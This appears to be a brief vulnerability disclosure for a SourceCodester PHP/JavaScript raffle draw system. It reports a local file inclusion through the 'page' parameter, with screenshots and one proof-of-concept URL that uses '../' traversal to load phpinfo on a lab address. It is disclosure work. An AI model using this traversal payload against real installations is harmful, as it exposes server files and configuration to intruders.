vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15951/raffle-draw-system-using-php-and-javascript-free-source-code.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：

![1674055132712](https://user-images.githubusercontent.com/30823782/213210410-fae4892e-8a9e-4673-aa09-3a6a2251967a.jpg)
http://192.168.249.88/php-js-raffle-draw/index.php?page=../dashboard/phpinfo
![image](https://user-images.githubusercontent.com/30823782/213210535-76f45f3f-1347-4b2f-b7a2-b6153b78fa56.png)
